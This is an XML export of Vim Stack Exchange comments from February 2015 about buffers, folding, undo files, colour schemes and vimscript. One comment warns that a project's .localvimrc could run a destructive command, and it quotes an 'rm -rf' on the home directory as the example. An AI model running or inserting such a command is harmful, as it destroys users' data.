  <row Id="1620" PostId="2094" Score="0" Text="@guido I don't think you can delete this question due to it having answers, but you can add close votes to your own question (I once did that on SO, anyway)... In any case, the question is still useful, many people will search for *&quot;How to make vimrc settings applicable for a directory tree only&quot;*, and not for *&quot;How to make vimrc settings applicable for a project only&quot;*; so it's useful as an &quot;entry point&quot; to the canonical question. This is why duplicates are never removed :-)" CreationDate="2015-02-22T21:48:53.673" UserId="51" />
  <row Id="1621" PostId="2094" Score="1" Text="@Carpetsmoker it seems i can delete (even if there is an accepted answer, weird); probably i cannot vote because i haven't enough reputation. Please do if you can, actually the question wording is quite different so it may still be worthy" CreationDate="2015-02-22T21:56:19.530" UserId="188" />
  <row Id="1622" PostId="2106" Score="0" Text="And, now I see I misread part of the question, he did call out ranges and selections." CreationDate="2015-02-22T22:16:41.663" UserId="227" />
  <row Id="1623" PostId="2109" Score="0" Text="I might be wrong, but doesn't this open an extra tab (as seen in my question about opening tabs by default)?" CreationDate="2015-02-22T23:50:24.797" UserId="205" />
  <row Id="1625" PostId="2083" Score="0" Text="Thanks @carpetsmoker, I wanted to add the `ctags` tag, but didn't have the rep." CreationDate="2015-02-23T00:02:04.053" UserId="915" />
  <row Id="1627" PostId="2117" Score="2" Text="Thanks, my bad. I've been looking at cpo, http://vimdoc.sourceforge.net/htmldoc/usr_41.html#use-cpo-save etc." CreationDate="2015-02-23T00:44:49.250" UserId="220" />
  <row Id="1628" PostId="2076" Score="0" Text="Right then, sorry to have annoyed you. However, I am sure there are others who might find the answers below helpful. Sometimes beginners such as myself don't understand what they are seeing in the manual, as the manual only provides one point of view and is at a fixed difficulty level." CreationDate="2015-02-23T00:48:46.807" UserId="810" />
  <row Id="1630" PostId="2100" Score="0" Text="There seems to be a common misconception that repeat.vim is required for repeating to work on *all* custom operators. However, it is only needed for operators that work outside of the simple *operator-motion* paradigm, such as [surround.vim](https://github.com/tpope/vim-surround) and [lion.vim](https://github.com/tommcdo/vim-lion). Both of these accept additional characters after defining the motion. Without hooking into retreat.vim, typing `.` after using these operators would require re-typing the additional characters as well." CreationDate="2015-02-23T01:41:30.107" UserId="64" />
  <row Id="1631" PostId="2118" Score="1" Text="*it sounds like a bit of an XY problem*: Why? I'm undo-ing with `u`, and I accidentally go past the changes I made right now ... I'm not sure what the original &quot;X-problem&quot; could be here?" CreationDate="2015-02-23T02:04:48.790" UserId="51" />
  <row Id="1632" PostId="2118" Score="1" Text="I now about `:earlier` by the way, but I still need to *guess*; just as I need to *guess* when using the `u` ... In cases it probably a bit better, but I would prefer something more explicit (if possible)." CreationDate="2015-02-23T02:05:48.217" UserId="51" />
  <row Id="1633" PostId="2110" Score="2" Text="Great function and command! Some improvements: (1) Use `[&lt;f-args&gt;]` instead of `&quot;&lt;args&gt;&quot;` -- that way, the `pattern` parameter will be a List (array) and you won't have to deal with manually splitting the string. (2) Pass a non-zero as the third argument to `glob()` to have it return a List. Then you can avoid manually splitting there, too. You'll need to pass `0` as the second argument to skip it without affecting the behavior: `glob(l:p, 0, 1)`." CreationDate="2015-02-23T02:17:52.297" UserId="64" />
  <row Id="1634" PostId="2109" Score="1" Text="If you're referring to my answer on that question, the difference there is that I used `:argdo tabedit %`, which opens a new tab for each argument. Starting with one tab and opening *n* new ones would naturally leave you with *n+1* tabs. `:tab all` is a much better solution." CreationDate="2015-02-23T02:24:06.777" UserId="64" />
  <row Id="1635" PostId="2118" Score="1" Text="@Carpetsmoker &quot;X&quot; is &quot;I want to undo *just* these changes that I made most recently.&quot; &quot;Y&quot; is &quot;How can I undo changes and ignore the undofile?&quot; You sort of still have to guess, but you said in your question that the last changes you made were last week or earlier, so you could just do something like `:ea 5d`. You could also use the `:ea 1f` approach. In any case, it's much less granular." CreationDate="2015-02-23T02:38:39.907" UserId="88" />
  <row Id="1636" PostId="2118" Score="0" Text="&quot;X&quot; and &quot;Y&quot; just seem a rephrasing of the same problem to me ? I did mention &quot;weeks&quot; in my question, but it could also be hours, or minutes (modified that) ...  This is not a bad answer *as such* by the way, I was (and am) just hoping there is something better..." CreationDate="2015-02-23T02:57:44.060" UserId="51" />
  <row Id="1637" PostId="2119" Score="1" Text="The `:syn off` mentioned in the linked answer isn't filetype-specific, and looks like the easiest and most straightforward way to do this." CreationDate="2015-02-23T08:46:39.577" UserId="970" />
  <row Id="1638" PostId="2110" Score="0" Text="@tommcdo Thanks! Answer improved :-)" CreationDate="2015-02-23T09:18:57.817" UserId="51" />
  <row Id="1639" PostId="2109" Score="0" Text="@tommcdo I was talking of [Josh Petrie's answer](http://vi.stackexchange.com/a/544/205). You wouldn't happen to one of his aliases, would you? :)" CreationDate="2015-02-23T10:41:44.117" UserId="205" />
  <row Id="1641" PostId="2109" Score="0" Text="Haha, nope. I must have been thinking of a different question!" CreationDate="2015-02-23T10:44:53.157" UserId="64" />
  <row Id="1642" PostId="2121" Score="0" Text="Did you mean `:bnext` instead of `:cnext`?" CreationDate="2015-02-23T10:51:02.730" UserId="64" />
  <row Id="1643" PostId="2119" Score="0" Text="@IngoKarkat Seeing as Carpetsmoker wrote that answer, I'm guessing it's not sufficient for his needs." CreationDate="2015-02-23T10:58:51.150" UserId="343" />
  <row Id="1644" PostId="2119" Score="0" Text="Yeah, it's what I use now on occasion, but it has the obvious side-effect of disabling all syntax highlighting (which is why I don't use it that often) ... Perhaps it's the best possible answer, both perhaps there's also a better way (so I thought it would be useful to ask again over here)." CreationDate="2015-02-23T11:00:16.503" UserId="51" />
  <row Id="1645" PostId="2121" Score="0" Text="Do you specifically need it to be the *quickfix* window? Or do you just want to be able to see the open buffers in a window? (Because there's several plugins to do the latter)." CreationDate="2015-02-23T11:01:52.693" UserId="343" />
  <row Id="1646" PostId="110" Score="0" Text="I think the OP means an existing buffer that is *not* the current one." CreationDate="2015-02-23T11:03:07.463" UserId="343" />
  <row Id="1648" PostId="2118" Score="0" Text="I'm with @Carpetsmoker on this one. I've known about :earlier for some time, but I still have undofile switched off for exactly the reason described in the question." CreationDate="2015-02-23T11:25:27.277" UserId="343" />
  <row Id="1649" PostId="2115" Score="0" Text="This is a question I've wondered since the unveiling of the undofile feature, and one I've been meaning to get around to asking since the unveiling of this site! Hoping there's a good answer. I think I'd also accept an answer that gave a command that reverted the file to the state it was in since the last time you *opened* it. (Or better, jumped back to that undo state.)" CreationDate="2015-02-23T11:27:46.843" UserId="343" />
  <row Id="1650" PostId="2121" Score="0" Text="I want to be able to browse open buffers in a window. Indeed quickfix is not reuired" CreationDate="2015-02-23T11:31:04.977" UserId="983" />
  <row Id="1651" PostId="2124" Score="0" Text="+1 -&gt; good idea! not so bad :-)" CreationDate="2015-02-23T11:32:36.017" UserId="983" />
  <row Id="1652" PostId="2123" Score="0" Text="tks Ingo, I tested a bit bufexplorer and I like it. I posted also here because a stackoverflow suggested to do" CreationDate="2015-02-23T11:33:47.390" UserId="983" />
  <row Id="1653" PostId="2127" Score="1" Text="thanks for explanations, tommcdo. Qbuffers is beautiful! Maybe i'd add a :copen at last of your call to immediately open the quickfix window and maybe it could be useful to report cursor position. I have to study a bit of vimscript :-)" CreationDate="2015-02-23T11:46:02.857" UserId="983" />
  <row Id="1654" PostId="2121" Score="0" Text="@tommcdo: yes sorry, my usual typos. I mean :bnext and I updated the question" CreationDate="2015-02-23T11:49:17.927" UserId="983" />
  <row Id="1655" PostId="2123" Score="0" Text="Yes, I saw that. I would have preferred you had then deleted the original SO post, or at least linked to the cross-posting." CreationDate="2015-02-23T12:48:43.417" UserId="970" />
  <row Id="1656" PostId="2130" Score="2" Text="Isn't `:g/^/m0` the same as `:g/^/move 0`, which is John's answer?" CreationDate="2015-02-23T13:15:40.787" UserId="205" />
  <row Id="1657" PostId="2130" Score="0" Text="@muru I think so, but this one is shorter (according to vim wikia) and I've added different explanation with few additional examples of using command lines." CreationDate="2015-02-23T13:17:10.037" UserId="467" />
  <row Id="1658" PostId="2130" Score="0" Text="Yes, I upvoted because of the other commands (I came to post `tac` as well). But I suspect the downvote was because of the answer being repeated." CreationDate="2015-02-23T13:18:30.320" UserId="205" />
  <row Id="1659" PostId="2130" Score="0" Text="I'm aware that `tac` was mentioned by OP, but all other similar questions would be duplicate of this anyway, so it's good to mentioned it again. John took this cmd from @tommcdo comment, I've taken it initially from [DerMike](http://stackoverflow.com/a/8312402/55075), but I think he taken it simply from wikia, so I've gave credits to vim wikia, so it's not completely duplicate as the explanation is completely different." CreationDate="2015-02-23T13:23:28.367" UserId="467" />
  <row Id="1660" PostId="2131" Score="4" Text="A caveat about using partial buffer names: if the partial buffer name appears at the beginning of a word boundary in some buffer's path, no buffer with the partial name in the middle of a word will be accessible by the `:b` command. For example, if you have two buffers `path/to/foo` and `path/to/tofu`, the command `:b f&lt;Tab&gt;` will never match `path/to/tofu`, since it matches at the beginning of a word in `path/to/foo`." CreationDate="2015-02-23T13:36:19.207" UserId="64" />
  <row Id="1661" PostId="2132" Score="0" Text="I think this *may* just be a bug in the Perl folding, but I'm not sure ... You can perhaps look at `/usr/share/vim/vim74/syntax/perl.vim` line 426 ... Being a Perl hacker, you might have more luck deciphering the regexps that control this :-)" CreationDate="2015-02-23T13:40:43.330" UserId="51" />
  <row Id="1662" PostId="2010" Score="0" Text="@Rich, I guess that I don't have the palette set up correctly. Do you (or someone else) know how to correctly set that up for Xfce Terminal?" CreationDate="2015-02-23T14:23:22.717" UserId="779" />
  <row Id="1663" PostId="2058" Score="0" Text="This caused a similar problem to setting t_Co=16. I'm fairly certain I have a problem with the palette, but I have yet to figure it out." CreationDate="2015-02-23T14:48:21.250" UserId="779" />
  <row Id="1664" PostId="2010" Score="0" Text="@Oberdiear You could try this: https://github.com/sgerrand/xfce4-terminal-colors-solarized" CreationDate="2015-02-23T15:04:30.023" UserId="343" />
  <row Id="1665" PostId="1934" Score="3" Text="I also find `d` with `a` (outer), or `i` (inner) and an object specifier very useful. Objects such as `w` for word, `p` for paragraph, `(` or `b` for `(...)`, `[` for `[...]`, `{` or `B` for `{...}` etc. [documentation for visual-operators](http://vimdoc.sourceforge.net/htmldoc/visual.html#visual-operators)." CreationDate="2015-02-23T15:13:18.227" UserId="850" />
  <row Id="1666" PostId="2129" Score="1" Text="Can you press `&lt;c-6&gt;` instead of `&lt;c-^&gt;`?" CreationDate="2015-02-23T15:34:51.387" UserId="778" />
  <row Id="1667" PostId="2138" Score="0" Text="I like this answer. It also doesn't highlight stuff (if `hlsearch` is enabled) like the `:g/` command from the other answers... Performance is perhaps worse, though? Since it `getline(1, line('$'))` gets the entire buffer in memory. `reverse()` seems to be in-place, so that should take very little memory as such..." CreationDate="2015-02-23T15:35:16.150" UserId="51" />
  <row Id="1668" PostId="2108" Score="0" Text="Related: [How to get vim to open multiple files into tabs at once](http://superuser.com/questions/171763/how-to-get-vim-to-open-multiple-files-into-tabs-at-once) at superuser SE" CreationDate="2015-02-23T15:38:37.887" UserId="467" />
  <row Id="1670" PostId="2108" Score="0" Text="@kenorb Yes. And it has exactly the same answer already here, except with no explanation on what it does. So how does linking to it add any value?" CreationDate="2015-02-23T15:40:47.097" UserId="51" />
  <row Id="1671" PostId="2108" Score="0" Text="There are some other answers, and new answers can come there. Secondly there are few other similar linked/related there, so users can learn more from related onces as well." CreationDate="2015-02-23T15:42:10.993" UserId="467" />
  <row Id="1673" PostId="2058" Score="0" Text="What terminal emulator are you using? If I recall correctly, konsole's built-in solarized configuration is not fully usable and one needs to use settings from the original solarized repository…" CreationDate="2015-02-23T15:45:50.923" UserId="869" />
  <row Id="1674" PostId="2108" Score="0" Text="I've learned this one-liner: `:args *.c | tab all`. The other question is more popular than this, so it's good to link it as well." CreationDate="2015-02-23T15:50:14.357" UserId="467" />
  <row Id="1675" PostId="2030" Score="1" Text="This is a useful plugin, but won't help here, as the solarized colorscheme already goes to considerable effort to work in terminal Vim under both 16-color and 256-color terminals." CreationDate="2015-02-23T15:52:12.860" UserId="343" />
  <row Id="1677" PostId="2140" Score="0" Text="This is seems the same as using `:args *.vim`? At least, it behaves the same, and `:help next_f` documents it as being the same..." CreationDate="2015-02-23T15:56:50.620" UserId="51" />
  <row Id="1678" PostId="2140" Score="0" Text="It's shorter and simple and you didn't mention that. The behaviour is the same, as you asked in the question for that." CreationDate="2015-02-23T15:57:24.877" UserId="467" />
  <row Id="1680" PostId="2130" Score="0" Text="It adds more value, as it's much shorter version with proper explanation and I'm also crediting the right sources. Using shell commands is very simple and convenient. If people don't agree, they can simply down-vote, no big deal." CreationDate="2015-02-23T16:03:12.267" UserId="467" />
  <row Id="1681" PostId="2130" Score="0" Text="@Carpetsmoker I'm not sure what value was adding info about `-n`, `-b`, `-c` parameters if they were not used in examples. It's only more confusing. I don't understand the point of it." CreationDate="2015-02-23T16:09:26.510" UserId="467" />
  <row Id="1684" PostId="2130" Score="0" Text="@Carpetsmoker Please note that John's main answer looks like `:g/^/exe &quot;normal ddggP&quot;`, and it's not obvious for `:g/^/m0`, and usually if I see something like that in the first paragraph, I'm going to the next answer, as it's discouraging." CreationDate="2015-02-23T16:12:23.293" UserId="467" />
  <row Id="1686" PostId="2130" Score="0" Text="The `-r` option causes the input to be displayed in reverse order, by line. So you meant something else I think." CreationDate="2015-02-23T16:13:48.140" UserId="467" />
  <row Id="1688" PostId="2130" Score="0" Text="@Carpetsmoker Example doesn't use any of `-b`, `-c` and `-n` options, so there is no point of mentioning it, as it's just simple line reversal. They can look in `man tail` if they require." CreationDate="2015-02-23T16:19:05.380" UserId="467" />
  <row Id="1690" PostId="2130" Score="0" Text="@Carpetsmoker I couldn't edit John's answer as it's not a simple change and I'd have to change too many things, so it would be against author intention." CreationDate="2015-02-23T16:28:41.637" UserId="467" />
  <row Id="1691" PostId="2058" Score="0" Text="I use Xfce Terminal." CreationDate="2015-02-23T16:30:40.513" UserId="779" />
  <row Id="1692" PostId="2098" Score="1" Text="I find this to be the most intuitive way, personally. I added a small mapping in my .vimrc so that after deleting the first, I can highlight the second and hit `&lt;C-X&gt;` to exchange:`xnoremap &lt;C-x&gt; &lt;Esc&gt;\`.\`\`gvP\`\`P`" CreationDate="2015-02-23T16:31:15.910" UserId="680" />
  <row Id="1694" PostId="2141" Score="0" Text="Cool :-) How do I use it? Can I just install it and it will be enabled by default? Is it also possible to enable/disable this only for specific filetypes?" CreationDate="2015-02-23T16:36:37.523" UserId="51" />
  <row Id="1695" PostId="2098" Score="0" Text="@MattBoehm Ah, quite useful. Thanks :-)" CreationDate="2015-02-23T16:39:30.877" UserId="51" />
  <row Id="1696" PostId="2137" Score="6" Text="Good post :-) FYI, your screenshot is rather difficult to read on my screen due to poor contrast (especially the red, and in a lesser degree the purple)." CreationDate="2015-02-23T16:42:11.410" UserId="51" />
  <row Id="1697" PostId="2096" Score="3" Text="Please elaborate on your answer according to [site standards](http://meta.vi.stackexchange.com/q/99/24)." CreationDate="2015-02-23T16:47:57.137" UserId="24" />
  <row Id="1698" PostId="2141" Score="0" Text="Enabled for everything by default. Submit a PR if you want anything like that. I may do it myself at some point." CreationDate="2015-02-23T16:52:03.787" UserId="489" />
  <row Id="1700" PostId="2135" Score="0" Text="In theory, the 'formatexpr' sounds like what you want to look at. However, when I play with it locally, it doesn't work as I'd expect it to. Instead of calling my function when `textwidth` is exceeded, it's doing it for every non-whitespace character typed. This could still work, but would be a big performance hit." CreationDate="2015-02-23T17:16:40.410" UserId="680" />
  <row Id="1701" PostId="2134" Score="2" Text="+1 ... Does your local-vimrc plugin prevent some of the security issues that could happen? For example, I often download or checkout the source of a project (including small ones) to investigate something. *Anyone* could put a `.localvimrc` in that, and do all sorts of evil stuff, or other, non-malicious, harmful things, like maybe `system('rm -rf /$HOME/$UNDEFINED_ON_MY_SYSTEM')` or some such..." CreationDate="2015-02-23T17:19:44.420" UserId="51" />
  <row Id="1702" PostId="2134" Score="0" Text="Yes and No, it does nothing to prevent to code to execute. However, you could force the pattern searched (`g:local_vimrc`) to something that makes no sense as you are opening vim. This will require some knowledge about how to launch vim with parameters. I guess, I'd better add blacklists and such to permit to emulate sandboxes. This would be easier to open files from unsecured projects. My next _eventual_ course of action for this plugin was to permit to support `vimrc_local` outside of the current directory." CreationDate="2015-02-23T18:05:48.060" UserId="626" />
  <row Id="1703" PostId="2139" Score="0" Text="I believe you are completely on the right track. I think I don't have the palette installed correctly. Could you walk me through the process? I appreciate all your help, @Rich." CreationDate="2015-02-23T18:29:51.523" UserId="779" />
  <row Id="1704" PostId="2129" Score="0" Text="do you mean Ctrl-1 to go to buffer number 1 ? Unfortunately doesn't work. nothing happen" CreationDate="2015-02-23T18:52:30.257" UserId="983" />
  <row Id="1708" PostId="2144" Score="1" Text="I initially misread your question but I believe this is what you're looking for: http://stackoverflow.com/questions/2573021/how-to-redirect-ex-command-output-into-current-buffer-or-file" CreationDate="2015-02-23T19:18:20.283" UserId="685" />
  <row Id="1709" PostId="2144" Score="0" Text="Is this what you want: [How to save window, split, and buffer layout](http://vi.stackexchange.com/q/287/51)? Or do you *only* want the list of bufffers?" CreationDate="2015-02-23T19:22:58.590" UserId="51" />
  <row Id="1711" PostId="2135" Score="2" Text="@MattBoehm I think you're experiencing: &quot;The expression is also evaluated when 'textwidth' is set and **adding text beyond that limit**&quot; ... `formatexpr` seems the way to go to me!" CreationDate="2015-02-23T19:52:32.783" UserId="51" />
  <row Id="1712" PostId="2129" Score="1" Text="No. Some terminals can understand Ctrl-6 which is the same as Ctrl-^ on the US keyboard." CreationDate="2015-02-23T19:54:10.807" UserId="778" />
  <row Id="1714" PostId="2058" Score="0" Text="I think I got it working: try to force TERM to xterm-256color, while using the solarized preset from the terminal's preferences, not from the solarized xfce-terminal git repository.&#xA;&#xA;This along with the BCE hack above did the trick for xfce4-terminal for me." CreationDate="2015-02-23T20:08:20.717" UserId="869" />
  <row Id="1715" PostId="2058" Score="0" Text="(There's still something fishy with the underlying terminal emulation _and_ font rendering, and I guess I got reminded why I went back to plain old xterm on Linux…)" CreationDate="2015-02-23T20:12:53.267" UserId="869" />
  <row Id="1716" PostId="2135" Score="0" Text="@Carpetsmoker for me, if 'textwidth' is 40, and I start typing on a new line, the expression was evaluated for every non-space keystroke, including the first letter typed. This may be due to some bug on my end. If formatexpr is working as documented for you/the asker, then it certainly seems like the solution." CreationDate="2015-02-23T20:35:34.073" UserId="680" />
  <row Id="1717" PostId="839" Score="2" Text="Note that a multi-line string will add whitespace characters, which may be a problem if whitespace matters in the string." CreationDate="2015-02-23T20:41:52.003" UserId="680" />
  <row Id="1718" PostId="2132" Score="0" Text="`za` toogles folds for the current line. I assume that the lines you are toggling on are not in any folds except for one big fold that includes the whole file. You can try `set foldcolumn=12` to better visualize how folds are nested." CreationDate="2015-02-23T20:47:16.663" UserId="680" />
  <row Id="1719" PostId="2132" Score="0" Text="Doing so will help you determine whether you want to adapt your understanding to account for how things currently work or to adapt perl's folding to better fit how you want it to work." CreationDate="2015-02-23T20:48:28.170" UserId="680" />
  <row Id="1720" PostId="2093" Score="0" Text="I agree that it's hard to answer the question &quot;How do I make folding do the right thing for text of mixed structure?&quot; when any two people will have differing opinions about what is right. I would suggest picking a singular simple foldmethod (indent, marker, manual) and adapting the text as you read it so that it's folded as desired. It is fairly trivial for a user to select a block of text and make a fold manually (`zf`) or by indenting (`&gt;`) as they read. I don't understand how a script could make this simpler." CreationDate="2015-02-23T21:03:55.093" UserId="680" />
  <row Id="1721" PostId="1961" Score="0" Text="Yeah, this method isn't perfect, but like you mentioned, it's cross-platform, and it may also be faster (running commandline-tools on startup can cause a bit of a delay on Windows Vim, at least, that was the case when I used it a few years ago)." CreationDate="2015-02-23T21:18:19.197" UserId="51" />
  <row Id="1722" PostId="123" Score="0" Text="I think you mean `ctrl`+`A`." CreationDate="2015-02-23T21:28:33.310" UserId="687" />
  <row Id="1723" PostId="2144" Score="0" Text="@jmathew that's exactly what I was looking for. I never knew about the redir function, this is very useful" CreationDate="2015-02-23T21:59:56.400" UserId="1011" />
  <row Id="1724" PostId="2147" Score="0" Text="Thanks, this is exactly what I wanted!" CreationDate="2015-02-23T22:00:22.560" UserId="1011" />
  <row Id="1726" PostId="476" Score="0" Text="`SuperWrite` works, but it echoes the file back at you. Running it `:silent`ly has you enter your password invisibly." CreationDate="2015-02-23T23:38:01.063" UserId="488" />
  <row Id="1727" PostId="476" Score="0" Text="@TankorSmash Thanks; updated answer. Not sure what you mean with &quot;enter your password invisibly&quot;, though? Adding `silent` seems to work fine?" CreationDate="2015-02-23T23:41:58.130" UserId="51" />
  <row Id="1728" PostId="2149" Score="1" Text="Thanks. Just what I was looking for. And thanks for the primer on vi/Vim terminology. One correction: while the command is called &quot;splitview&quot; the `:splitview` command does not exist. It's just `:sview` or `:sv`." CreationDate="2015-02-23T23:57:40.710" UserId="1014" />
  <row Id="1729" PostId="2149" Score="0" Text="@adurity Oops, thanks. That was in the help file, but I misread &gt;_&lt;" CreationDate="2015-02-24T00:01:51.577" UserId="51" />
  <row Id="1731" PostId="1938" Score="0" Text="Your shortened version of the autocmd is missing the `*`." CreationDate="2015-02-24T03:22:00.293" UserId="15" />
  <row Id="1732" PostId="120" Score="0" Text="related: &quot;Move to next/previous line with same indentation &quot; on Vim Tips Wiki http://vim.wikia.com/wiki/Move_to_next/previous_line_with_same_indentation" CreationDate="2015-02-24T03:54:51.257" UserId="67" />
  <row Id="1733" PostId="476" Score="0" Text="I don't run vim with sudo, so that may be at play here, but when I go to sudo tee the file, it prompts me for the sudo password. If its silent, I don't see the prompt, but still need to enter a password." CreationDate="2015-02-24T04:52:08.477" UserId="488" />
  <row Id="1734" PostId="2157" Score="1" Text="I think it's because your folds don't actually begin with with the line containing the opening brackets. Vim only uses the fold text on the line where the fold begins. See, for example, how brace placement affects it in C: http://imgur.com/3h70dPf,wfCLPm7" CreationDate="2015-02-24T06:07:58.670" UserId="205" />
  <row Id="1735" PostId="476" Score="0" Text="What you're seeing is tee's standard functionality of echoing to stdout as well as the file given.  A solution is to redirect stdout to /dev/null, a la:&#xA;&#xA;    `w ! tee % &gt; /dev/null`&#xA;&#xA;This will still echo the result of the command (a single line), but not the entire buffer contents." CreationDate="2015-02-24T07:01:11.310" UserId="554" />
  <row Id="1736" PostId="2158" Score="3" Text="Which would be of not much use once the command has already started." CreationDate="2015-02-24T07:04:05.197" UserId="205" />
  <row Id="1737" PostId="2158" Score="0" Text="I mean that one could run the shell script instead of the slow command.  Having it background itself obviates the need to remember to do it at run time.&#xA;&#xA;I guess I'm not understanding the use case very well.  If it's the same command that I keep forgetting to background, I'd use the shell script.  If this is happening with arbitrary commands, I'd consider making a habit of switching to an actual shell to do so." CreationDate="2015-02-24T07:10:26.473" UserId="554" />
  <row Id="1738" PostId="2129" Score="1" Text="+1 Great, It work! I use an Italian keyboard layout (using putty terminal emulator). So: `1&lt;C-6&gt;` switchs to buffer number 1. Thanks!" CreationDate="2015-02-24T07:12:30.790" UserId="983" />
  <row Id="1739" PostId="560" Score="3" Text="I use [vim-characterize](http://github.com/tpope/vim-characterize) for this precise thing.  It expands the functionality of `ga` to show more info than normal." CreationDate="2015-02-24T07:16:21.263" UserId="554" />
  <row Id="1741" PostId="2158" Score="0" Text="I use `tmux` by default, but problem is that my Vim session (with open files and such) is still useless. I *could* switch to another pane, and run my script there, but that are a lot more actions than `:!gitk %` for example... The thing with using scripts is that I would have to pre-create many of these scripts for every possible command. Perhaps it's not a bad idea for some of the most used commands (such as `gitk` &amp; `mupdf`) though." CreationDate="2015-02-24T08:11:20.983" UserId="51" />
  <row Id="1742" PostId="2157" Score="0" Text="But this is Python, no braces involved (`from __future__ import braces`)... How did you configure folding? And can you paste this code snippet (or another that demonstrates the problem)? Vim folds to a single line, but as muru mentioned, your folds start a line late." CreationDate="2015-02-24T08:16:33.997" UserId="51" />
  <row Id="1743" PostId="2157" Score="0" Text="@Carpetsmoker the braces are only for illustration of where the fold starts. The same effect can be seen on, say, Haskell." CreationDate="2015-02-24T08:46:23.777" UserId="205" />
  <row Id="1744" PostId="655" Score="0" Text="@guido I don't understand how setting only the `browsedir` setting affects the behaviour you're describing. That setting affects what directory the GUI file browser opens, not what directory is used for command-line completion." CreationDate="2015-02-24T10:13:36.080" UserId="343" />
  <row Id="1745" PostId="655" Score="0" Text="@Rich you perfectly right; I forgot to delete `let g:netrw_keepdir=0` from my vimrc before testing this!" CreationDate="2015-02-24T11:55:32.600" UserId="188" />
  <row Id="1746" PostId="2162" Score="0" Text="While the answer below correctly solves your problem, I've found that disabling keys such as arrow keys or backspace help you get used to doing things more properly. Backspace in vim is done with `X` (and delete with `x`), but often what you really wanted to do was `db` for example to delete until the beginning of the word, or `daw` to delete the whole word etc. If you have backspace available, you risk using this suboptimal key in more cases than necessary." CreationDate="2015-02-24T13:04:10.517" UserId="850" />
  <row Id="1748" PostId="560" Score="0" Text="&quot;this command assumes UTF-8&quot; - the documentation says this, but my experience is that it works in any `encoding` (but does not respect `fileencoding`)." CreationDate="2015-02-24T13:27:58.840" UserId="880" />
  <row Id="1749" PostId="560" Score="1" Text="After further experimentation, a if `encoding` is set to a non-utf8 multibyte encoding such as cp932, `g8` will only print the first byte, but `ga` will show the full character number." CreationDate="2015-02-24T13:35:52.733" UserId="880" />
  <row Id="1750" PostId="2157" Score="0" Text="@MikeHearn My previous answer was completely incorrect. I've updated it to include a solution to the problem." CreationDate="2015-02-24T13:58:11.030" UserId="343" />
  <row Id="1759" PostId="2160" Score="1" Text="This is exactly the workflow I'm hoping to improve on. The problem is that you need to close whatever you started..." CreationDate="2015-02-24T14:27:42.273" UserId="51" />
  <row Id="1763" PostId="2162" Score="2" Text="@Shahbaz I disagree: While in insert mode it makes sense to be able to make minor corrections using the backspace key. I agree that one should learn how to use the normal mode commands, but it is not inproper to use backspace while in insert mode for minor corrections." CreationDate="2015-02-24T15:24:06.020" UserId="21" />
  <row Id="1764" PostId="2162" Score="2" Text="@KarlYngveLervåg, in the case of backspace I agree (actually I don't have it disabled myself). However, it looks like the OP has the default behavior of backspace which doesn't work for example with start of line, but works within the line. Still, the OP has better options than backspace. For example, instead of backspacing to the previous line, one can use `J` which takes care of the whitespaces as well. In short, backspace is fine for quick typo fixes during writing, but other than that there are better alternatives." CreationDate="2015-02-24T15:55:28.310" UserId="850" />
  <row Id="1765" PostId="2168" Score="0" Text="It's weird that this works for you—it shouldn't. STOP/CONT should just pause and resume the process, nothing more. It doesn't work here, in either console vim or gvim." CreationDate="2015-02-24T16:46:34.260" UserId="31" />
  <row Id="1767" PostId="2171" Score="0" Text="I installed `snipMate` but although it works in c files, the default snips (that already contain a begin snippet) don't load in `.tex` files." CreationDate="2015-02-24T16:56:50.127" UserId="852" />
  <row Id="1769" PostId="2173" Score="0" Text="Brilliant. `fun! TexEnv(name)&#xA;  call append(line(&quot;.&quot;), &quot;\\end{&quot; . a:name . &quot;}&quot;)&#xA;  call append(line(&quot;.&quot;)-1, &quot;\\begin{&quot; . a:name . &quot;}&quot;)&#xA;endfun` seems to do exactly what I was looking for! And I will probably keep it at `:Texenv`." CreationDate="2015-02-24T17:02:16.513" UserId="852" />
  <row Id="1770" PostId="2171" Score="0" Text="Verify that the `'filetype'` corresponds to the snippet file: `:setl filetype?`" CreationDate="2015-02-24T17:10:24.203" UserId="970" />
  <row Id="1776" PostId="2174" Score="0" Text="Works like a charm! Thanks! BTW, U as &quot;Unfuck my screen&quot; is hilarious lol" CreationDate="2015-02-24T17:21:46.607" UserId="977" />
  <row Id="1778" PostId="2171" Score="0" Text="Yes, that does the trick. Thanks. +1" CreationDate="2015-02-24T17:31:49.550" UserId="852" />
  <row Id="1782" PostId="2174" Score="0" Text="Haha yeah, I'm glad you clicked through to read that.  His configs have a number of helpful and funny things in them" CreationDate="2015-02-24T18:20:36.513" UserId="680" />
  <row Id="1784" PostId="2161" Score="0" Text="Great approach. Could this answer be generalized to also handle say Ruby, with its outdented `end` to finish a block?" CreationDate="2015-02-24T18:29:44.913" UserId="67" />
  <row Id="1785" PostId="2176" Score="0" Text="My understanding is that the expression should return a number, and that number will be used to determine at which level the given line will be folded. 0 is not folded, 1 is the outermost fold, 2 is a fold nested inside a level 1 fold, and so on" CreationDate="2015-02-24T18:55:01.510" UserId="64" />
  <row Id="1786" PostId="2180" Score="0" Text="Using just numbers will work, but it's worth noting that foldexpr's can evaluate to other special values, like =, a1, s1, &gt;1, &lt;1, -1" CreationDate="2015-02-24T19:03:44.527" UserId="680" />
  <row Id="1788" PostId="2181" Score="0" Text="It's worth noting that &lt;tab&gt; is the same keycode as &lt;C-I&gt;, so you will be overriding that functionality. Also, unless the right side of your mapping contains another mapping that you are sure you want to expand, you should use nnoremap or vnoremap instead" CreationDate="2015-02-24T19:07:44.950" UserId="680" />
  <row Id="1789" PostId="2181" Score="1" Text="You use: `Plugin 'ervandew/supertab'` in your vimrc ... I expect that probably changes some Tab key behaviour? Does it work when you use vimrc with no plugins or even no vimrc file? See: [How do I debug my vimrc file?](http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file?s=1|0.5919)." CreationDate="2015-02-24T19:11:13.663" UserId="51" />
  <row Id="1790" PostId="2181" Score="1" Text="Minor note, though I doubt this will fix the issue: To adjust indentation levels in Normal mode, I'd recommend using the Normal mode `&gt;&gt;` and `&lt;&lt;` instead of entering Visual mode with `v&gt;` and `v&lt;`. Analogous to `dd`, `&gt;&gt;` and `&lt;&lt;` operate on the current line." CreationDate="2015-02-24T19:16:51.413" UserId="64" />
  <row Id="1791" PostId="2181" Score="0" Text="@MattBoehm Yes, &lt;tab&gt; is the same keycode as&lt;C-I&gt;.But it is strange that it work long time ago." CreationDate="2015-02-24T19:35:45.203" UserId="1037" />
